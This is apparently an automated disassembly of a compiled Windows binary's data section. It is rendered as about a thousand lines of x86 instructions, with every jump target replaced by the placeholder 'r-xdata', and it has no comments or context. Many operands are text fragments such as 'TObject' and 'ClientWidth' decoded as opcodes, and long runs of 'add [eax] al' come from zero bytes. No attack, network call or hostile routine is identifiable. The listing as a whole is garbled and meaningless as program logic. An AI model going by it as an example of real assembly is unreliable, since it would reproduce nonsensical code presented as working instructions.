outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
mov eax eax
inc eax
cmp al 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + edi + 0x44 ] ch
inc eax
add [ ebp + 0x44 ] ch
add [ eax - 0x7bffbb98 ] cl
xor eax [ eax ]
js r-xdata
add [ ebx + 0x443ba4c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
cmp eax [ eax + eax + 0x70 ]
add [ eax ] al
add [ edx + edi + 0x33700044 ] dl
inc esp
add [ eax + ebp * 2 + 0x44 ] cl
add [ eax + 0x68 ] ah
inc esp
add [ eax + 0xf004468 ] al
push esp
inc esp
jb r-xdata
inc esp
add [ eax - 0x2fffbb9a ] bl
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add ah bh
inc sp
add ah bh
inc esp
add [ eax + 0x66 ] cl
inc esp
add al ch
arpl [ eax + eax - 0x5c ] ax
inc esp
add [ ebx + 0x66540044 ] ch
inc esp
add [ 0x66740044 ] al
inc esp
inc esp
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x39 ] si
inc esp
add [ eax + edi ] cl
inc esp
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
inc esp
inc esp
add [ eax ] al
outsb
je r-xdata
insd
or [ ebx + 0x6f ] al
xor eax [ eax ]
shl [ eax ] 0x40
add ah bl
xor [ eax ] al
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
popad
inc edx
add al cl
push ebx
inc edx
add [ edx + edi * 2 + 0x540e0044 ] al
inc ebx
outsd
outsb
je r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax + 0x7a ] bl
inc esp
add al bh
lea eax [ ecx ]
add [ esi - 0x72ebffbf ] cl
inc ecx
add ah bl
push ebx
add al dl
inc esp
add [ esi + 0x44 ] dh
outsd
insb
jae r-xdata
add al ch
pop ecx
add ah bl
adc eax 0x7ee80042
inc esp
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3c ] bl
inc esp
add [ eax + eax ] ah
add [ esp + ebp + 0x42 ] ah
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
cmp al 0x44
insb
cmp al 0x44
add [ edi ] al
push cs
push esp
inc ebx
outsd
outsb
je r-xdata
add [ ebp + 0x39c40040 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
or al 0x54
add al dh
pop ecx
inc ebp
add [ eax ] dh
jg r-xdata
add [ eax + 0x7f ] dl
inc esp
add [ edx + ebx * 2 ] cl
inc ebp
add [ eax ] dl
pop edx
inc ebp
add [ edi + edi * 2 + 0x44 ] dh
add ah ah
jl r-xdata
add [ ecx + ebx * 2 ] dh
inc ebp
add [ eax + 0x7e ] cl
inc esp
add [ ecx + ebx * 2 + 0x45 ] bl
add [ eax + 0x59 ] dh
inc ebp
add al al
jg r-xdata
pop ecx
jl r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax - 0x37ffbdeb ] ch
inc edx
add al ch
jle r-xdata
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
inc esp
add [ ebx ] al
or dl [ esp + eax * 2 + 0x72 ]
popad
inc edx
jne r-xdata
add al bh
pop ecx
inc ebp
add [ eax + eax * 4 + 0x44 ] al
add [ eax + eax * 4 ] ah
inc esp
add [ eax + eax * 4 + 0x44 ] ah
insd
bound ecx [ ebp + 0x69 ]
insb
or [ gs : ebx + 0x6f ] al
add [ edx ] dl
push esp
inc ebx
outsd
outsb
je r-xdata
inc ebp
add [ eax ] dl
jg r-xdata
add [ esi + edi * 2 + 0x44 ] bh
add [ ecx + ebx * 2 + 0x59c00045 ] ch
inc ebp
add [ esi + edi * 2 + 0x59e80044 ] dh
add [ eax ] dl
push ss
inc edx
add [ edi + edi * 2 + 0x15600044 ] dl
inc edx
add ah dh
adc eax 0x16480042
test al 0x15
inc edx
add al cl
jae r-xdata
push es
je r-xdata
inc esp
jb r-xdata
je r-xdata
jbe r-xdata
outsd
insb
jae r-xdata
or esp [ ebp + ebp * 2 + 0x41 ]
jne r-xdata
outsd
insb
push edx
inc ebp
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
cmp al 0x44
add al dl
sub al 0x42
add [ eax + eax ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
inc eax
add al ah
inc esp
add [ esi ] al
or [ ecx + eax * 2 + 0x6e ] dl
arpl [ eax + 0x6f ] bp
jb r-xdata
outsd
outsb
je r-xdata
imul ecx [ eax ] 0x43
outsd
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah ch
cmp eax 0x640b0044
jae r-xdata
inc esp
jb r-xdata
push ebx
je r-xdata
add ecx [ edx ]
push esp
outsb
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x3d ] dh
inc esp
add [ esi ] al
insd
bound ecx [ ebp + 0x66 ]
je r-xdata
inc esp
add [ edx ] cl
or [ ebx + eax * 2 + 0x61 ] dl
or ah [ ebx + esi * 2 + 0x44 ]
jb r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x443d7490
cmp eax 0x9030044
push esp
inc esp
jb r-xdata
add [ eax ] bh
outsd
insd
popad
je r-xdata
inc edx
add ah dl
jge r-xdata
outsd
insb
jae r-xdata
jpo r-xdata
add [ esi + edi - 0xb6fffbc ] edx
inc esp
add [ ecx ] al
andps xmm0 [ ebx + 0x6f ]
jo r-xdata
inc esp
add [ esi ] al
imul eax [ fs : edx + esi * 2 + 0x61 ] 0x67
jb r-xdata
imul edx [ edi + ebp * 2 + 0x70 ] 0x7
imul eax [ fs : edi + ebp * 2 + 0x63 ] 0x6b
push es
outsb
je r-xdata
or [ ebp + 0x62 ] ch
dec ebp
imul esp [ esp + 0x6c ] 0x6f430865
insd
bound edx [ edx + 0x69 ]
push 0x626d0874
jpe r-xdata
imul ebp [ edi + 0x6e ] 0x3e98c08b
inc esp
jo r-xdata
or cl [ eax ]
push esp
inc ebx
popad
dec ebp
outsd
jbe r-xdata
dec esp
popad
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ eax ] al
arpl [ eax ] cx
inc ebx
outsd
outsb
je r-xdata
add [ ebp + 0x3ce00040 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + edi + 0x44 ] bl
add [ eax + eax ] bl
add [ eax ] al
dec esp
add [ eax ] cl
inc ebx
outsd
add [ eax ] al
mov es [ ecx ]
adc al 0x8d
inc ecx
add [ esp + edi * 2 + 0x7ba40044 ] dh
inc esp
add [ eax ] dl
push esp
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
jb r-xdata
add [ eax ] al
xchg esp eax
inc esp
add [ esi ] al
popad
inc esp
add [ ecx ] al
or [ esp + edx * 2 + 0x61 ] edx
bound ecx [ edi + 0x72 ]
jb r-xdata
add [ ecx ] ecx
push esp
push esp
popad
inc ebp
outsb
je r-xdata
inc eax
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
outsd
insd
or [ ebx + 0x6f ] al
outsb
je r-xdata
push ebx
imul edi [ edx + 0x65 ] 0x736e6f43
je r-xdata
inc esp
add [ ebx + edi * 2 + 0x54100044 ] ah
add eax 0x0
outsb
jae r-xdata
inc esp
add [ eax + r-xdata ] dl
add [ edi ] ecx
push esp
inc ebx
outsd
imul ecx [ ebp + 0x66 ] 0x74
add eax 0x6f546b61
jo r-xdata
imul ebp [ esi + 0x64 ] 0x1
add [ ebx ] al
or edx [ ecx + eax * 2 + 0x6e ]
arpl [ eax + 0x6f ] bp
jb r-xdata
outsb
mov eax eax
cwde
inc esp
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ ecx ] al
add [ eax ] al
lea eax [ eax ]
cmp al 0x3e
insb
popad
outsd
insb
jae r-xdata
inc esp
outsd
insb
jae r-xdata
dec ebp
popad
js r-xdata
sub [ esp + eax * 2 ] bh
add [ eax ] eax
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
or [ ebp + 0x61 ] cl
inc ebx
outsd
outsb
jae r-xdata
imul ebp [ esi + 0x74 ] 0x657a6953
inc edx
outsd
je r-xdata
or [ ecx + 0x6b ] ah
popad
imul edx [ edx + 0x69 ] 0x67
push 0x6b610874
jb r-xdata
jb r-xdata
mov [ edi ] bh
inc esp
add [ edi ] al
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
lea eax [ eax ]
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add al ch
mov [ ecx ] es
loopne r-xdata
test [ ebx ] dh
inc eax
add [ eax + 0x33 ] bh
outsd
insb
add [ ebx ] al
add [ eax ] al
add [ esi + edi + 0x61060044 ] dl
add [ fs : eax ] eax
add [ eax ] al
outsd
insb
jae r-xdata
dec ebp
outsd
jne r-xdata
push esp
shl al 0x3d
push esp
dec ebp
outsd
inc ebp
jbe r-xdata
add [ eax ] cl
add [ eax ] al
[ eax ]
add al dh
inc esp
jne r-xdata
add [ eax + eax ] dl
add bh bh
sub [ esp + eax * 2 ] bh
add [ eax ] eax
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
or [ ebp + 0x69 ] cl
outsb
push edi
imul esp [ esp + esi * 2 + 0x68 ] 0x4400408d
inc eax
inc esp
add [ eax ] cl
or edx [ ebp + ecx * 2 + 0x6f ]
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
adc [ eax ] al
add bh bh
sub [ esp + eax * 2 ] bh
add [ eax ] eax
add [ eax ] al
add al [ eax ]
je r-xdata
inc ebx
outsd
outsb
jae r-xdata
popad
jb r-xdata
jae r-xdata
add bh bh
inc esp
jb r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax + 0x800443d ] dh
insd
dec ebp
popad
outsb
jne r-xdata
inc esp
add [ ebx ] al
or [ esp + eax * 2 + 0x72 ] edx
popad
dec ebx
imul ebp [ esi + 0x64 ] 0x1
inc eax
add [ esi + edi ] bh
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
dec ebp
outsd
jbe r-xdata
jne r-xdata
inc eax
add [ ebx + 0x4440bcc0 ] cl
add [ eax ] cl
andps xmm1 [ ebp + 0x6f ]
outsb
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x6 ] si
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x443ef074
jb r-xdata
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] cl
imul ebp [ esi + 0x74 ] r-xdata
or [ ebx + 0x6f ] al
imul eax [ edi + ebp * 2 + 0x63 ] 0x6b
jb r-xdata
jae r-xdata
insb
jae r-xdata
add [ 0x66696853 ] al
je r-xdata
push edi
outsd
jb r-xdata
or [ esi ] al
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
arpl [ gs : eax + eax + 0x5 ] si
je r-xdata
inc esp
add [ eax ] dl
add [ eax ] al
[ eax ]
outsb
je r-xdata
imul ebp [ esi + 0x74 ] 0x443f5c73
add al ch
pop edi
inc ecx
add [ eax + eax ] al
or [ ebx + 0x6f ] al
add [ ecx + edx ] al
inc eax
add [ eax + 0x10 ] ch
inc eax
add [ eax + ebx * 2 + 0x41 ] bl
push esp
push ebx
inc esp
jb r-xdata
dec ebx
jns r-xdata
add [ ebx ] eax
outsb
jb r-xdata
outsb
je r-xdata
inc edx
jne r-xdata
add [ esi ] al
push esp
dec edi
push 0x53746669
je r-xdata
je r-xdata
push ebx
push 0xb746669
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
outsb
or al 0x54
dec ebp
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
push es
or [ esi ] al
push ebx
outsb
je r-xdata
popad
outsb
add [ ecx + edx ] al
inc eax
add [ ecx + edx ] al
dec edi
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
popad
add [ ecx ] al
je r-xdata
inc edx
jne r-xdata
or [ esi ] al
arpl [ ebp + 0x7 ] sp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
add [ ecx ] al
jae r-xdata
push ebx
outsd
jne r-xdata
or [ esi ] al
jb r-xdata
je r-xdata
inc esp
jb r-xdata
inc eax
add [ eax + edx ] bh
add al 0x11
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
add [ eax + r-xdata ] dl
push 0x5c004010
pop eax
inc ecx
jb r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
inc esp
jb r-xdata
jb r-xdata
jo r-xdata
inc esp
jb r-xdata
jbe r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
pop eax
pop es
dec ecx
outsb
or edx [ ebx + edx * 2 + 0x68 ]
outsb
add [ 0x66696853 ] al
je r-xdata
je r-xdata
arpl [ ebp + 0x7 ] sp
push esp
dec edi
add [ ecx + 0x7 ] ebx
dec ecx
jb r-xdata
outsb
je r-xdata
outsb
je r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
popad
jb r-xdata
inc ebp
jbe r-xdata
or [ edx ] ecx
inc esp
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx + 0xa ] si
cmp al 0x10
jbe r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
push ebx
je r-xdata
inc eax
add [ eax + edx ] bh
inc eax
add ah ch
cmp eax 0x10000044
inc eax
add [ eax + r-xdata ] dl
or [ esi ] cl
push esp
inc esp
jb r-xdata
cmp al 0x10
outsb
je r-xdata
push esp
dec ebx
jns r-xdata
inc esp
add [ eax ] cl
push cs
jb r-xdata
add [ ecx ] al
pop eax
pop es
dec ecx
outsb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
jb r-xdata
add al 0x11
inc eax
add [ eax + edi ] cl
jb r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
outsb
je r-xdata
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
outsb
je r-xdata
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
outsb
je r-xdata
outsb
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx + 0x54 ] si
inc esp
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
inc esp
or [ esi ] al
outsb
je r-xdata
je r-xdata
je r-xdata
add al 0x11
inc eax
add [ eax + ebx * 2 + 0x41 ] bl
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ ebp + 0x41200040 ] cl
inc esp
add [ eax ] cl
or [ ebx + ecx * 2 + 0x65 ] edx
jns r-xdata
je r-xdata
jb r-xdata
imul esp [ esi + 0x74 ] 0x74617453
add [ gs : ecx ] al
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ebx ] eax
dec ebx
jns r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
je r-xdata
jb r-xdata
pop eax
add [ ecx ] al
push esp
dec edi
jb r-xdata
push ebx
outsb
jb r-xdata
add cl [ eax ]
push es
jb r-xdata
jb r-xdata
adc [ eax ] eax
cmp al 0x10
inc esp
add al bl
inc edx
inc esp
add [ eax ] cl
or eax 0x646e4554
inc esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x4 ] si
adc [ eax ] eax
or al 0x38
push ebx
outsb
add al 0x8
push es
dec ecx
add [ eax + 0x7 ] ebx
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
or [ esi ] cl
jbe r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
push esp
inc ebp
outsb
jb r-xdata
add [ ecx + edx ] al
inc eax
add [ eax ] ch
adc [ eax ] al
lea eax [ eax ]
test al 0x41
inc esp
add [ eax ] cl
push cs
push esp
inc ebx
push 0x4007261
adc [ eax ] eax
sub [ eax ] dl
inc eax
add [ ebp + 0x41a80040 ] cl
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
or [ esi ] al
push esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
add al 0x11
inc eax
add [ ebx + edi ] ch
inc esp
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ ebp + 0x439c0040 ] cl
inc esp
add [ eax ] cl
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
inc eax
add [ eax + edx ] bh
inc eax
add [ ebx + eax * 2 ] dh
inc esp
add [ eax ] cl
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
add al 0x11
inc eax
add [ ecx + edx ] al
inc eax
add [ eax + edx ] bh
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
jo r-xdata
adc [ eax ] eax
pop es
inc edx
outsd
outsd
insb
outsb
je r-xdata
je r-xdata
jb r-xdata
inc eax
add [ eax + edx ] bh
inc eax
add [ ebp + 0x42900040 ] cl
inc esp
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
popad
jb r-xdata
add al 0x11
inc eax
add [ ecx + edx ] al
inc eax
add [ eax + edx ] bh
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
inc esp
outsd
or [ esi ] al
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsd
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
popad
outsb
add [ ecx + edx ] al
jb r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jbe r-xdata
push ebx
add ecx [ eax ]
push es
add al 0x11
inc eax
add [ eax + 0x3d ] dh
inc esp
add [ eax + ebx * 2 + 0x41 ] bl
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
or [ esp + edx * 2 ] cl
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x45 ] bp
inc esp
outsd
inc esp
outsd
insb
jb r-xdata
popad
jb r-xdata
outsb
je r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
push ebx
je r-xdata
jbe r-xdata
jbe r-xdata
inc ebp
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61430701
imul esi [ ebp + 0x49 ] 0x456f666e
jbe r-xdata
push 0x65
popad
jb r-xdata
je r-xdata
inc esp
outsd
arpl [ ebx + 0x45 ] bp
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
or [ ecx ] cl
dec esi
ja r-xdata
je r-xdata
inc eax
add [ ebx + edi ] ch
inc esp
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add ah ch
cmp eax 0x10000044
inc eax
add [ eax + r-xdata ] dl
add al 0x11
outsb
je r-xdata
inc ebx
jpe r-xdata
test [ edx + 0x44 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
jo r-xdata
outsb
je r-xdata
outsb
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edi + ecx + 0x54 ] si
inc esp
jb r-xdata
je r-xdata
jne r-xdata
adc [ 0x6c666e49 ] ecx
push esp
inc ebx
outsd
outsb
je r-xdata
outsd
arpl [ ebx + 0x43 ] bp
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
inc eax
add [ eax + edx ] bh
jb r-xdata
pop ss
push esp
inc ebp
jbe r-xdata
je r-xdata
add [ eax ] cl
andps xmm0 [ ebx + 0x61 ]
outsb
push edx
jae r-xdata
inc esp
add eax 0x65530608
outsb
jb r-xdata
pop es
outsb
arpl [ ebp + 0x52 ] sp
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + edx + 0x8 ] si
dec ebp
outsd
add eax 0x63655254
je r-xdata
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x4 ] si
adc [ eax ] eax
sub al 0x3b
inc esp
add ah ah
inc esp
inc esp
add [ eax ] cl
adc [ edi + eax * 2 + 0x65 ] edx
je r-xdata
inc esp
add [ 0x6f6c6c41 ] eax
push esp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
outsd
insb
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
ja r-xdata
pop es
inc edx
outsd
outsd
insb
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebx + 0x4446f8c0 ] cl
push edi
push 0x456c6565
jbe r-xdata
push 0x6e490774
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] 0x6e657645
outsd
outsb
jae r-xdata
outsb
je r-xdata
jb r-xdata
jb r-xdata
or [ edx ] cl
inc esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0xa ] si
jae r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
imul esp [ edi + 0x68 ] 0x6e490774
push eax
outsd
jae r-xdata
outsb
inc esp
outsd
arpl [ ebx + 0x7 ] bp
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ edx + ecx * 2 + 0x44 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebx + 0x444570c0 ] cl
add [ edi ] eax
inc ebx
popad
jne r-xdata
or [ ebp + 0x6f ] cl
add [ ecx + edx ] al
inc eax
add [ edx + ecx * 2 + 0x525c0044 ] al
inc esp
add [ eax ] al
adc [ eax ] al
cwde
inc esp
inc esp
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
inc edx
outsd
outsd
insb
popad
outsb
inc esp
jb r-xdata
or [ edx ] ecx
arpl [ ecx + ecx + 0xa ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
je r-xdata
push edi
push 0x556c6565
add [ eax ] cl
push ss
push esp
dec ebp
outsd
jne r-xdata
add [ eax + edx ] bh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
clc
inc esi
inc esp
outsb
jb r-xdata
jb r-xdata
add eax 0x65530608
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
or [ ebp + 0x69 ] ecx
outsb
dec eax
push edx
jae r-xdata
push es
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ ebx + 0x444670c0 ] cl
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x6f ] dl
jne r-xdata
adc [ eax ] al
cmp al 0x10
jpe r-xdata
dec esi
ja r-xdata
or [ esi + 0x65 ] ecx
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x7a004448 ] dh
dec edx
js r-xdata
insb
outsd
ja r-xdata
add eax 0x65530608
outsb
jb r-xdata
add [ edi ] eax
dec eax
popad
or [ ebp + 0x6f ] cl
jne r-xdata
add al 0x11
inc eax
add [ eax ] ecx
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
pop es
dec ecx
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
dec esi
ja r-xdata
add [ eax ] ecx
push esp
dec edi
add [ eax ] ecx
je r-xdata
dec ecx
outsb
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
je r-xdata
jpe r-xdata
add [ eax + edx ] bh
inc ebp
jbe r-xdata
inc ebp
imul esp [ gs : edi + 0x68 ] 0x6e490774
add ah bh
or eax 0x33840042
inc eax
add al bh
mov [ 0x30c00044 ] eax
inc eax
add ah bl
xor [ eax ] al
pop esp
add [ eax + eax - 0x28 ] 0xd00044b0
add [ eax ] al
mov al 0x6d
inc ecx
push eax
outsd
jo r-xdata
jne r-xdata
inc ebp
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
adc [ gs : eax ] cl
push eax
outsd
jae r-xdata
je r-xdata
outsb
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
jo r-xdata
je r-xdata
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] cl
push 0x6e490774
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
loopne r-xdata
je r-xdata
outsb
add [ esp + edx + 0x337c0042 ] bh
inc eax
jo r-xdata
add [ eax - 0x43ffbe93 ] dh
adc al 0x42
add [ ebx + esi + 0x40 ] bh
inc ebp
js r-xdata
outsb
je r-xdata
add [ edx ] cl
push edi
push 0x446c6565
insb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
push eax
outsd
jae r-xdata
outsb
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ eax + ebx * 2 + 0x41 ] bl
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] ecx
jbe r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
inc esp
add [ eax ] cl
lea eax [ eax ]
adc [ eax + 0x44 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ecx * 2 + 0x4a880044 ] bl
inc esp
add [ eax ] al
jbe r-xdata
inc esp
add [ ecx + eax ] bl
add [ edx + 0x4a ] bh
outsb
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ eax + ebx * 2 + 0x41 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
insb
inc edi
inc esp
add [ eax ] cl
adc dl [ ebx + eax * 2 + 0x6f ]
outsb
add [ edi ] eax
dec eax
popad
outsb
insb
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
push 0x65
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
adc [ eax ] cl
dec ebp
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
